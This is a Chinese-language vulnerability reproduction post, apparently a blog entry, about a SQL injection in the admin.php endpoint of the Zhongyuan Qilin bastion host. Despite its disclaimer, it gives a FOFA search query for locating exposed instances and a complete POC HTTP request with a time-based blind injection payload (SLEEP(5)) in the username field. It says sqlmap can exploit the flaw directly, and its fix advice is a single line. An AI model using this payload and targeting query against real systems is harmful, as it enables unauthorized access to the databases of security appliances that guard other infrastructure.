# 原创
：  漏洞复现--中远麒麟堡垒机SQL注入

# 漏洞复现--中远麒麟堡垒机SQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**

### 一：漏洞描述

麒麟堡垒机用于运维管理的认证、授权、审计等监控管理，在该产品admin.php处存在SQL 注入漏洞

### 二:漏洞影响版本

–中远麒麟堡垒机

### 三：网络空间测绘查询

fofa语句：<br/> cert.subject=“Baolei”<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b6ec0d9bd603bdb5313e00d55342e98e.jpeg"/><br/> 需要下载的可后台私我我发你

### 四：漏洞复现

POC：

```
POST /admin.php?controller=admin_commonuser HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Length: 78
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8591386581fbc8f45063ac9c1cf1c329.jpeg"/><br/> 盲注5s<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/65b57faec97caf1f5278fe5908f86b1f.jpeg"/><br/> 漏洞存在，sqlmap直接利用<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/96ec70638d98995b17350449621a572d.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/bc2c69c1c71a9933dd28bec1ac925eec.jpeg"/>

### 五：修复方案

自行寻找厂家发布的安全补丁，若暂无补丁，尽快将系统放入内网。
